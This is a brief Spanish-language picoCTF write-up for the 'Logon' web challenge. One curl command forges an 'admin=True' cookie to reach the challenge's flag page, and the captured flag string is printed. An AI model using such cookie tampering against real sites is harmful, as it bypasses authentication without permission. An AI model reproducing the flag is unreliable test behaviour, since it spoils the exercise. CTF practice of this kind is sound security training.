# Logon
## Objetivo

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796
## Solución

```shell
tux3000-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: admin=True" | grep picoCTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   4563      0 --:--:-- --:--:-- --:--:--  4571
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
tux3000-picoctf@webshell:~$
```
## Notas adicionales

Accedí a la pagina y me logue como Joe y obtuve acceso a la ruta flag.

|Comando | Descripcion |
|-|-|
|curl |  Sirve para transferir datos hacia o desde un servidor con URL|
## Referencias